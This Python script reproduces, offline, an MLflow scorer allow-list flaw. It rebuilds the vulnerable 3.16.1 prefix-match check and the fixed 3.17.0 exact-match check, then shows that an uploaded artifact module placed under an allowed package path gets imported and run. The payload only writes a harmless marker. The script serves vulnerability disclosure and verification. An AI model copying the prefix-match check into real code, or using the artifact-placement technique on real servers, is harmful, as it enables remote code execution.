"""Local, network-free reproduction of the MLflow third-party scorer allow-list flaw
(GHSA-26p8-2jq9-3vq9). No MLflow install, no server, no network, no cloud.

It rebuilds the allow-list check exactly as written in MLflow 3.16.1 (prefix match)
and 3.17.0 (exact match), points both at a throwaway package tree that mirrors
mlflow/genai/scorers/trulens, and drops a "caller-placed" module where MLflow's
file-backed artifact layout would put an uploaded run artifact.

The caller-placed module is harmless: its constructor only writes a random marker
string into a temp directory. "Did attacker code run?" = "was that marker written?".
"""
import importlib, json, os, secrets, shutil, sys, tempfile

ROOT = "simml.genai.scorers"
ALLOWED_OLD = frozenset({f"{ROOT}.ragas", f"{ROOT}.deepeval", f"{ROOT}.trulens", f"{ROOT}.phoenix"})
# 3.17.0 keeps an explicit list of real submodules; the subset that matters here:
ALLOWED_NEW = frozenset({f"{ROOT}.trulens", f"{ROOT}.trulens.scorers.agent_trace", f"{ROOT}.phoenix"})

def check_3_16_1(module_path):  # mlflow/genai/scorers/base.py @ 3.16.1
    return any(module_path == m or module_path.startswith(m + ".") for m in ALLOWED_OLD)

def check_3_17_0(module_path):  # mlflow/genai/scorers/base.py @ 3.17.0
    return module_path in ALLOWED_NEW

def build_tree(base, marker_dir, token, run_id):
    pkg = os.path.join(base, *ROOT.split("."))
    for sub in ["trulens", "phoenix", os.path.join("trulens", "scorers")]:
        os.makedirs(os.path.join(pkg, sub), exist_ok=True)
    for d in [base + "/simml", base + "/simml/genai", pkg, pkg + "/trulens", pkg + "/phoenix", pkg + "/trulens/scorers"]:
        open(os.path.join(d, "__init__.py"), "a").close()
    with open(os.path.join(pkg, "trulens", "scorers", "agent_trace.py"), "w") as f:
        f.write("class AgentTrace:\n    def __init__(self, **kw):\n        self.ok = True\n")
    # MLflow file-backed layout: <artifact_location>/<run_id>/artifacts/<uploaded file>
    art = os.path.join(pkg, "trulens", run_id, "artifacts")
    os.makedirs(art)
    # Python 3 imports these dirs as namespace packages; no __init__.py needed.
    with open(os.path.join(art, f"audit_{token}.py"), "w") as f:
        f.write(
            "import os\n"
            "class Probe:\n"
            "    def __init__(self, **kw):\n"
            f"        open(os.path.join({marker_dir!r}, 'marker.txt'), 'w').write({token!r})\n"
        )
    return f"{ROOT}.trulens.{run_id}.artifacts.audit_{token}"

def attempt(check, module_path, class_name, marker_dir, token):
    marker = os.path.join(marker_dir, "marker.txt")
    if os.path.exists(marker):
        os.remove(marker)
    allowed = check(module_path)
    constructed = False
    if allowed:
        try:
            mod = importlib.import_module(module_path)
            cls = getattr(mod, class_name, None)
            if cls is not None:
                cls()
                constructed = True
        except Exception as e:  # noqa
            pass
    ran = os.path.exists(marker) and open(marker).read() == token
    return {"check_allowed": allowed, "class_constructed": constructed, "caller_code_ran": ran}

def main():
    base = tempfile.mkdtemp(prefix="allowlist-")
    marker_dir = tempfile.mkdtemp(prefix="marker-")
    token = secrets.token_hex(8)
    run_id = "r" + secrets.token_hex(8)
    caller_mod = build_tree(base, marker_dir, token, run_id)
    sys.path.insert(0, base)
    cases = [
        ("A real scorer module that ships with the package", f"{ROOT}.trulens.scorers.agent_trace", "AgentTrace"),
        ("A file the caller uploaded as a run artifact under an allowed package", caller_mod, "Probe"),
        ("A module outside every allowed package", "json", "JSONDecoder"),
    ]
    rows = []
    for label, mp, cls in cases:
        for ver, fn in [("3.16.1 (prefix match)", check_3_16_1), ("3.17.0 (exact match)", check_3_17_0)]:
            for k in list(sys.modules):
                if k.startswith("simml"):
                    del sys.modules[k]
            r = attempt(fn, mp, cls, marker_dir, token)
            rows.append({"case": label, "check": ver, "module_path": mp.replace(run_id, "<run_id>").replace(token, "<token>"), **r})
    shutil.rmtree(base); shutil.rmtree(marker_dir)
    print(json.dumps({"python": sys.version.split()[0], "rows": rows}, indent=2))

if __name__ == "__main__":
    main()
